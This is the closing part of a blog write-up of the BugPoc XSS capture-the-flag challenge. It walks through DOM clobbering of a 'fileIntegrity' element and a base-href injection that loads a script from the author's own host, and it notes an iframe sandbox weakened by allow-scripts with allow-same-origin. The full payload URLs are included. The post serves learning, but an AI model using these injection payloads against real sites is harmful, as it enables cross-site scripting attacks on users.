src="https://cdn.embedly.com/widgets/media.html?src=https%3A%2F%2Fwww.youtube.com%2Fembed%2F2up8J9dErHI%3Ffeature%3Doembed&amp;display_name=YouTube&amp;url=https%3A%2F%2Fwww.youtube.com%2Fwatch%3Fv%3D2up8J9dErHI&amp;image=https%3A%2F%2Fi.ytimg.com%2Fvi%2F2up8J9dErHI%2Fhqdefault.jpg&amp;key=a19fcc184b9711e1b4764040d3dc5c07&amp;type=text%2Fhtml&amp;schema=youtube" width="854" height="480" frameborder="0" scrolling="no"><a href="https://medium.com/media/32cc358152f0c741022ad18d9e724061/href">https://medium.com/media/32cc358152f0c741022ad18d9e724061/href</a></iframe><p><a href="https://portswigger.net/web-security/dom-based/dom-clobbering">DOM clobbering | Web Security Academy</a></p><p>I used a similar payload to this:</p><p>&lt;output id=fileIntegrity&gt;Hey Shirley&lt;/output&gt; and let’s have a look what’s inside fileIntegrity.value now</p><figure><img alt="" src="https://cdn-images-1.medium.com/max/830/1*7A-YeDSi8PvaLuFRCVp1lw.png" /></figure><p>Focus on the console, we have now control over the fileIntegrity.value.</p><figure><img alt="" src="https://cdn-images-1.medium.com/max/1024/1*Tri867YKr3PFeQ-F2Ux_9w.png" /><figcaption><a href="https://wacky.buggywebsite.com/frame.html?param=Hello,%20World!%3C/title%3E%3Coutput%20id=fileIntegrity%3EvyWxnR5%2FSfkpBXTjK7tyUvoeEZCT%2BfK2ayxsse%2BsBvs=%3C/output%3E%3Cbase%20href=%27//sudistark.github.io/new/%27%3E">https://wacky.buggywebsite.com/frame.html?param=Hello,%20World!%3C/title%3E%3Coutput%20id=fileIntegrity%3EvyWxnR5%2FSfkpBXTjK7tyUvoeEZCT%2BfK2ayxsse%2BsBvs=%3C/output%3E%3Cbase%20href=%27//sudistark.github.io/new/%27%3E</a></figcaption></figure><p>But again this didn’t work we have to overcome one more protection in place to pop an alert. (Others like confirm,prompt were also showing same error).I even tried with window.alert() but same error.</p><figure><img alt="" src="https://cdn-images-1.medium.com/max/1024/1*vjk-s6dHSS6FniUn9zaSLA.png" /><figcaption>Ignored call to ‘alert()’. The document is sandboxed, and the ‘allow-modals’ keyword is not set.</figcaption></figure><p>This is the point where I had to give up.</p><p>Upon loading the url in firefox this warning was shown in the console, “An iframe which has both allow-scripts and allow-same-origin for its sandbox attribute can remove its sandboxing.”</p><p>This error in firefox and the ‘allow-modals’ error which we get in chrome were mentioning the word sandbox so I knew the last part would be related to something like bypassing the iframe sandbox and then we might be able to execute our js without any error.</p><p>After the challenge was over, I checked the writeups by other people and found that as the iframe sandox attribute is set to allow-scripts and allow-same-origin which makes the sandbox useless.</p><p>These are taken from other people writeups.</p><figure><img alt="" src="https://cdn-images-1.medium.com/max/478/1*QWpmSklIhcprJG1KCRUfbg.png" /></figure><p>The difference between window.top and window.parent can be found here:</p><p><a href="https://stackoverflow.com/questions/3473946/what-is-the-difference-between-window-window-top-and-window-parent#:~:text=If%20you%20are%20within%20a,refers%20to%20the%20outermost%20frame">https://stackoverflow.com/questions/3473946/what-is-the-difference-between-window-window-top-and-window-parent</a></p><p>Here are some of the blogs which I read:</p><ul><li><a href="https://navjeetrathore.medium.com/bugpoc-xss-ctf-challenge-write-up-39c6c1fff7cd">BugPoc XSS ctf challenge write-up</a></li><li><a href="https://blog.geekycat.in/ctf-writeup/">BugPoc XSS Challenge - Writeup</a></li><li><a href="https://navjeetrathore.medium.com/bugpoc-xss-ctf-challenge-write-up-39c6c1fff7cd">BugPoc XSS ctf challenge write-up</a></li></ul><p>Changed my payload according to what was mentioned in these blogs:</p><figure><img alt="" src="https://cdn-images-1.medium.com/max/1024/1*MT1cKMEvGWWMwO8l_1or9w.png" /><figcaption><a href="https://wacky.buggywebsite.com/frame.html?param=Hello,%20World!%3C/title%3E%3Coutput%20id=fileIntegrity%3EkrmRFEi7jlxl25eA5ubo1m4MFKpavCfmWGD9uAXqgAE=%3C/output%3E%3Cbase%20href=%27//sudistark.github.io/new/%27%3E">https://wacky.buggywebsite.com/frame.html?param=Hello,%20World!%3C/title%3E%3Coutput%20id=fileIntegrity%3EkrmRFEi7jlxl25eA5ubo1m4MFKpavCfmWGD9uAXqgAE=%3C/output%3E%3Cbase%20href=%27//sudistark.github.io/new/%27%3E</a></figcaption></figure><p>And the happiness comes after seeing this:</p><figure><img alt="" src="https://cdn-images-1.medium.com/max/1024/1*CUOjBhE9tY6Ol3toqHIAyw.png" /></figure><p>Thankyou!!</p><p>Sya Everyonee!</p><img src="https://medium.com/_/stat?event=post.clientViewed&referrerSource=full_rss&postId=24d4ee8b0faa" width="1" height="1" alt="">

  </div><a class="u-url" href="/2020/11/10/solving-bugpoc-xss-challenge.html" hidden></a>
</article>

      </div>
    </main><footer class="site-footer h-card">
  <data class="u-url" href="/"></data>

  <div class="wrapper">

    <div class="footer-col-wrapper">
      <div class="footer-col">
        <p class="feed-subscribe">
          <a href="http://localhost:4000/feed.xml">
            <svg class="svg-icon orange">
              <use xlink:href="/assets/minima-social-icons.svg#rss"></use>
            </svg><span>Subscribe</span>
          </a>
        </p>
        <ul class="contact-list">
          <li class="p-name">GitHub User</li>
          <li><a class="u-email" href="mailto:your-email@domain.com">your-email@domain.com</a></li>
        </ul>
      </div>
      <div class="footer-col">
        <p>Write an awesome description for your new site here. You can edit this line in _config.yml. It will appear in your document head meta (for Google search results) and in your feed.xml site description.
</p>
      </div>
    </div>

    <div class="social-links"><ul class="social-media-list"></ul>
</div>

  </div>

</footer>
</body>

</html>
